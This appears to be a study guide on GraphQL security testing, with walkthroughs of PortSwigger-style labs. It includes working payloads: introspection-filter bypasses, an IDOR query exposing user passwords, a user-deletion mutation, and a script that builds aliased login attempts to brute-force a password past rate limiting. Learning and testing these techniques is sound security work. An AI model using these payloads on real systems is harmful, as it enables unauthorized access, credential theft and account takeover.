#  GraphQL API vulnerabilities 

<br><br>

## Summary

<!-- MarkdownTOC -->

- [Resources](#resources)
- [What is GraphQL?](#what-is-graphql)
- [Finding GraphQL endpoints](#finding-graphql-endpoints)
    - [Universal queries](#universal-queries)
    - [Common endpoint names](#common-endpoint-names)
    - [Request methods](#request-methods)
    - [Initial testing](#initial-testing)
- [Exploiting unsanitized arguments](#exploiting-unsanitized-arguments)
- [Discovering schema information](#discovering-schema-information)
    - [Probing for introspection](#probing-for-introspection)
    - [Running a full introspection query](#running-a-full-introspection-query)
    - [Visualizing introspection results](#visualizing-introspection-results)
- [Bypassing GraphQL introspection defenses](#bypassing-graphql-introspection-defenses)
- [Bypassing rate limiting using aliases](#bypassing-rate-limiting-using-aliases)
- [GraphQL CSRF](#graphql-csrf)
    - [How do CSRF over GraphQL vulnerabilities arise?](#how-do-csrf-over-graphql-vulnerabilities-arise)
- [GraphQL Labs](#graphql-labs)
    - [Lab: Accessing private GraphQL posts](#lab-accessing-private-graphql-posts)
    - [Lab: Accidental exposure of private GraphQL fields](#lab-accidental-exposure-of-private-graphql-fields)
    - [Lab: Finding a hidden GraphQL endpoint](#lab-finding-a-hidden-graphql-endpoint)
    - [Lab: Bypassing GraphQL brute force protections](#lab-bypassing-graphql-brute-force-protections)
    - [Lab: Performing CSRF exploits over GraphQL](#lab-performing-csrf-exploits-over-graphql)

<!-- /MarkdownTOC -->


<br><br>

## Resources

* https://portswigger.net/web-security/graphql

* http://nathanrandal.com/graphql-visualizer/

* https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql


<br><br>

##  What is GraphQL? 


*  The data described by a GraphQL schema can be manipulated using three types of operation:

    * Queries fetch data.
    
    * Mutations add, change, or remove data.
    
    * Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.

* All GraphQL operations use the same endpoint, and are generally sent as a POST request. This is significantly different to REST APIs, which use operation-specific endpoints across a range of HTTP methods.


<br><br>

## Finding GraphQL endpoints 


###  Universal queries

* If you send query{\_\_typename} to any GraphQL endpoint, it will include the string {"data": {"\_\_typename": "query"}} somewhere in its response.


<br>

###  Common endpoint names

* GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

    * /graphql
    * /api
    * /api/graphql
    * /graphql/api
    * /graphql/graphql

* If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path. 


<br>

### Request methods

* If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods. 


<br>

###  Initial testing

* Once you have discovered the endpoint, you can send some test requests to understand a little more about how it works. If the endpoint is powering a website, try exploring the web interface in Burp's browser and use the HTTP history to examine the queries that are sent. 


<br><br>

## Exploiting unsanitized arguments 

* If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR). 


*  By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.

```
    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```

<br><br>


## Discovering schema information


###  Probing for introspection

It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.

```
    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
```

<br>


###  Running a full introspection query


* The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.

```
    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```


<br>


###  Visualizing introspection results

* Responses to introspection queries can be full of information, but are often very long and hard to process.

* You can view relationships between schema entities more easily using a GraphQL visualizer. This is an online tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types. 


<br><br>


## Bypassing GraphQL introspection defenses 

```
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.

When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded __schema{, then the below introspection query would not be excluded. 
```

```
#Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```


*  If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of x-www-form-urlencoded.

* The example below shows an introspection probe sent via GET, with URL-encoded parameters.

```
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

```

<br><br>

## Bypassing rate limiting using aliases


*  The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.

```
    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

<br><br>


## GraphQL CSRF 

###  How do CSRF over GraphQL vulnerabilities arise?

* CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

* POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

* However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API. 



<br><br>


## GraphQL Labs

### Lab: Accessing private GraphQL posts

Overview:

* The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 


Steps to exploit:

* Send the /graphql end point request to Burp repeater

* Right click on the request and select "GraphQL -> Set introspection query" option from the dropdown menu and submit the request

* In the response we'll see a list of the fields available, in particular the "postPassword" field is available

* Submit another request to repeater that is grabbing the data for a specific post, change the variable value to 3, and add the field "postPassword" on the request to get the flag



<br><br>

### Lab: Accidental exposure of private GraphQL fields

Overview:

*  The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

* To solve the lab, sign in as the administrator and delete the username carlos. 



Steps to exploit:

* Send the /graphql end point request to Burp repeater

* Right click on the request and select "GraphQL -> Set introspection query" option from the dropdown menu and submit the request

* In the response we'll see a list of the fields and operation names available, specifically we can find a getUser operation, and username/password fields

* Submit another request to Burp repeater and change the query to pull the username information using the getUser operation

* Query:

```
query getUser($id: Int!) {
        getUser(id: $id) {
        id
        username
        password
        }
    }
```

```
{
	"query":"\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n        id\n        	username\n        password\n        }\n    }",
	"operationName":"getUser",
	"variables":
			{
			"id":1
			}
}
```

Note: If you use Burp's built-in functionality which saves all of the accessible queries from the introspection request, we can test these queries easier/quicker.


<br><br>

### Lab: Finding a hidden GraphQL endpoint

Overview:

*  The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

* To solve the lab, find the hidden endpoint and delete carlos. 



Steps to exploit:

* Find the graphql API endpoint - /api
	
	* This endpoint was found by analyzing the responses the application was returning.  The application responded back with a "Not Found" message for invalid endpoint, while the /api endpoint returned a "Query not present" message.

	* Another thing to note here is that a POST request to the /api endpoint is not allowed, so a GET payload will need to be sent.

* Introspection defenses were bypassed by..

	* GET request to the /api endpoint

	* Right click on the request and select "GraphQL -> Set introspection query" option from the dropdown menu and submit the request

	* Appending a new line (%0a) after the "\_\_schema" keyword

* Query to bypass introspection:


```
/api?query=query+IntrospectionQuery+%7b%0a++++__schema%0a+%7b%0a++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++subscriptionType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++types+%7b%0a++++++++++++...FullType%0a++++++++%7d%0a++++++++directives+%7b%0a++++++++++++name%0a++++++++++++description%0a++++++++++++locations%0a++++++++++++args+%7b%0a++++++++++++++++...InputValue%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d%0a%0afragment+FullType+on+__Type+%7b%0a++++kind%0a++++name%0a++++description%0a++++fields%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++args+%7b%0a++++++++++++...InputValue%0a++++++++%7d%0a++++++++type+%7b%0a++++++++++++...TypeRef%0a++++++++%7d%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++inputFields+%7b%0a++++++++...InputValue%0a++++%7d%0a++++interfaces+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++enumValues%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++possibleTypes+%7b%0a++++++++...TypeRef%0a++++%7d%0a%7d%0a%0afragment+InputValue+on+__InputValue+%7b%0a++++name%0a++++description%0a++++type+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++defaultValue%0a%7d%0a%0afragment+TypeRef+on+__Type+%7b%0a++++kind%0a++++name%0a++++ofType+%7b%0a++++++++kind%0a++++++++name%0a++++++++ofType+%7b%0a++++++++++++kind%0a++++++++++++name%0a++++++++++++ofType+%7b%0a++++++++++++++++kind%0a++++++++++++++++name%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d
```

* Query decoded:

```
/api?query=query IntrospectionQuery {
    __schema
 {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

* Steps to delete the user carlos:

	* Confirm what ID is in scope for the user carlos


* Query to confirm user carlos:


```
/api?query=%71%75%65%72%79%20%67%65%74%55%73%65%72%28%24%69%64%3a%20%49%6e%74%21%29%20%7b%0a%20%20%20%20%20%20%20%20%67%65%74%55%73%65%72%28%69%64%3a%20%24%69%64%29%20%7b%0a%20%20%20%20%20%20%20%20%69%64%0a%20%20%20%20%20%20%20%20%75%73%65%72%6e%61%6d%65%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d&variables={"id"%3a3}
```

* Query decoded: (Note the parameter "variables" needs to be included)

```
/api?query=query getUser($id: Int!) {
        getUser(id: $id) {
        id
        username
        }
    }&variables={"id":3}
```

* Query to delete user carlos:

```
/api?query=mutation%28%24input%3a+DeleteOrganizationUserInput%29+%7b%0a++deleteOrganizationUser%28input%3a+%24input%29+%7b%0a++++user+%7b%0a++++++id%0a++++++username%0a++++%7d%0a++%7d%0a%7d&variables=%7b%22input%22%3a%7b%22id%22%3a3%7d%7d
```

* Decoded query:

```
/api?query=mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}&variables={"input":{"id":3}}
```


Note: If you use Burp's built-in functionality which saves all of the accessible queries from the introspection request, we can test these queries easier/quicker.


<br><br>


### Lab: Bypassing GraphQL brute force protections


Overview:

*  The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

* To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source. 


Steps to exploit:

* Use the script that is available in the lab to construct alias using the same operation to brute force the password for the user carlos

* Script:

```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

* Send the login graphql request to Burp repeater

* In the GraphQL tab in repeater, change the mutation arguments to look like below and include the output of the script within the operation


```
mutation login {
        
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }

    ...
}
```

* In the response, we can see which operation was successful in brute forcing the password, correlate the results with the password used in the request


<br><br>


### Lab: Performing CSRF exploits over GraphQL


Overview:

*  The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

* To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

* You can log in to your own account using the following credentials: wiener:peter. 


Steps to exploit:

https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api

